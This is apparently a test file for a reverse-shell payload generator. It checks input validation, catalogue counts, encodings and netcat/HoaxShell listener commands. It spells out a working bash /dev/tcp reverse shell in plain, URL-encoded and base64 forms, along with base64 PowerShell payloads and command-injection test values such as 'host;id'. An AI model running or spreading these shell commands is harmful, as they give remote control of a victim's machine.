import assert from 'node:assert/strict'
import {
  defaultPayloadSelections,
  generateListener,
  generateListenerForPreset,
  generatePayload,
  generateReverseShell,
  getPayload,
  isLowPort,
  isValidHost,
  isValidPort,
  listenerPresets,
  payloadCategories,
  payloadTypes,
  payloadsForCategory,
  shells,
} from '../src/tools/revshell/generator'

assert.equal(isValidHost('127.0.0.1'), true)
assert.equal(isValidHost('10.10.10.10'), true)
assert.equal(isValidHost('lab.example.test'), true)
assert.equal(isValidHost('host-name'), true)
assert.equal(isValidHost('256.1.1.1'), false)
assert.equal(isValidHost('host;id'), false)
assert.equal(isValidHost('host name'), false)
assert.equal(isValidHost(''), false)

assert.equal(isValidPort('1'), true)
assert.equal(isValidPort('65535'), true)
assert.equal(isValidPort('0'), false)
assert.equal(isValidPort('65536'), false)
assert.equal(isValidPort('9001;id'), false)
assert.equal(isValidPort(''), false)
assert.equal(isLowPort(80), true)
assert.equal(isLowPort(1024), false)

assert.deepEqual(Object.keys(defaultPayloadSelections()), payloadCategories.map(({ id }) => id))
assert.equal(payloadTypes.length, 3)
assert.deepEqual(
  payloadCategories.map(({ id }) => payloadsForCategory(id).length),
  [74, 9, 22, 10, 20],
)
for (const { id } of payloadTypes) {
  const legacyCommand = generateReverseShell('192.0.2.10', '4444', id)
  assert.ok(legacyCommand.includes('192.0.2.10'), `${id} legacy command includes the address`)
  assert.ok(legacyCommand.includes('4444'), `${id} legacy command includes the port`)
}

const options = { host: '192.0.2.10', port: '4444', shell: 'bash' }
const reverse = getPayload('ReverseShell', 'Bash -i')!
assert.equal(
  generatePayload(reverse, { ...options, category: 'ReverseShell' }),
  'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1',
)

const urlEncoded = generatePayload(reverse, { ...options, category: 'ReverseShell', encoding: 'url' })
assert.ok(urlEncoded.includes('%2Fdev%2Ftcp%2F192.0.2.10%2F4444'))
const doubleUrlEncoded = generatePayload(reverse, { ...options, category: 'ReverseShell', encoding: 'double-url' })
assert.ok(doubleUrlEncoded.includes('%252Fdev%252Ftcp%252F192.0.2.10%252F4444'))
const base64Encoded = generatePayload(reverse, { ...options, category: 'ReverseShell', encoding: 'base64' })
assert.equal(Buffer.from(base64Encoded, 'base64').toString(), 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1')

const bind = payloadsForCategory('BindShell')[0]
assert.ok(generatePayload(bind, { ...options, category: 'BindShell' }).includes('4444'))
const rubyBind = getPayload('BindShell', 'Ruby Bind')!
assert.ok(generatePayload(rubyBind, { ...options, category: 'BindShell' }).includes('TCPServer.new(4444)'))
const msf = payloadsForCategory('MSFVenom')[0]
const msfCommand = generatePayload(msf, { ...options, category: 'MSFVenom' })
assert.ok(msfCommand.includes('192.0.2.10'))
assert.ok(msfCommand.includes('4444'))
const msfBof = getPayload('MSFVenom', 'Windows Bind TCP ShellCode - BOF')!
const msfBofCommand = generatePayload(msfBof, { ...options, category: 'MSFVenom' })
assert.ok(msfBofCommand.includes('LPORT=4444'))
assert.ok(msfBofCommand.includes("-b '\\x00'"))
const hoax = payloadsForCategory('HoaxShell')[0]
const hoaxCommand = generatePayload(hoax, { ...options, category: 'HoaxShell' })
assert.ok(hoaxCommand.includes('192.0.2.10:4444'))
const hoaxListener = listenerPresets.find(({ id }) => id === 'hoaxshell')!
const hoaxPs = getPayload('HoaxShell', 'PowerShell IEX')!
const hoaxListenerOutput = generateListenerForPreset(hoaxListener, {
  ...options,
  category: 'HoaxShell',
  selectedPayload: hoaxPs,
})
assert.ok(hoaxListenerOutput.command.includes('-t ps-iex -p 4444'))
const assembled = payloadsForCategory('Assembled')[0]
const assembledCommand = generatePayload(assembled, { ...options, category: 'Assembled' })
assert.ok(assembledCommand.includes('\\xc0\\x00\\x02\\x0a'))
assert.ok(assembledCommand.includes('\\x11\\x5c'))

const powershellBase64 = getPayload('ReverseShell', 'PowerShell #3 (Base64)')!
const encodedPowershell = generatePayload(powershellBase64, { ...options, category: 'ReverseShell' })
assert.ok(encodedPowershell.startsWith('powershell -e '))
const powershellSource = Buffer.from(encodedPowershell.slice('powershell -e '.length), 'base64').toString('utf16le')
assert.ok(powershellSource.includes('192.0.2.10'))
assert.ok(powershellSource.includes('4444'))

const nc = listenerPresets.find(({ id }) => id === 'nc')!
const ncOutput = generateListenerForPreset(nc, {
  ...options,
  category: 'ReverseShell',
  selectedPayload: reverse,
})
assert.equal(ncOutput.command, 'nc -lvnp 4444')
assert.equal(ncOutput.warning, '')
const privilegedListener = generateListenerForPreset(nc, {
  ...options,
  port: '80',
  category: 'ReverseShell',
  selectedPayload: reverse,
})
assert.equal(privilegedListener.command, 'sudo nc -lvnp 80')

const udpPayload = getPayload('ReverseShell', 'Bash udp')!
const udpListener = generateListenerForPreset(nc, {
  ...options,
  category: 'ReverseShell',
  selectedPayload: udpPayload,
})
assert.equal(udpListener.command, 'nc -u -lvnp 4444')

assert.equal(generateListener(9001), 'nc -lvnp 9001')
assert.throws(() => generatePayload(reverse, { host: '127.0.0.1;id', port: 9001, shell: shells[0], category: 'ReverseShell' }))
assert.throws(() => generatePayload(reverse, { host: '127.0.0.1', port: 65536, shell: shells[0], category: 'ReverseShell' }))
assert.throws(() => generatePayload(assembled, { ...options, host: 'lab.example.test', category: 'Assembled' }))
assert.throws(() => generateListener('0'))

console.log('Revshell checks passed: validation, 135 catalogue templates, encodings, assembled bytes, HoaxShell and listeners.')
